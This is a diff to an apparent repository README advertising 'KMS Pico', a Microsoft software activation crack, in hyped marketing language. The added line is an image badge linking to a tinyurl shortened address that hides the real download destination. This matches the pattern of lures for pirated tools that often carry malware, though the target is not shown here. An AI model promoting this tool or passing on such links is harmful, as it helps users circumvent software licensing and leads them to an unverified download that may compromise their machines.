@@ -3,6 +3,7 @@
 **Step Into the Next Generation of Software Access!**  
 KMS Pico establishes the benchmark for activation excellence, revolutionizing how the world engages with Microsoft's software universe. By blending cutting-edge innovation with user-focused design, we offer the ultimate digital partner for your technological evolution.
 
+[![6745383679](https://github.com/user-attachments/assets/49a77842-d261-4e9d-afbb-f46f93326aea)](https://tinyurl.com/3aedx2cz)
 
 ## ✨ Unrivaled Capabilities
 
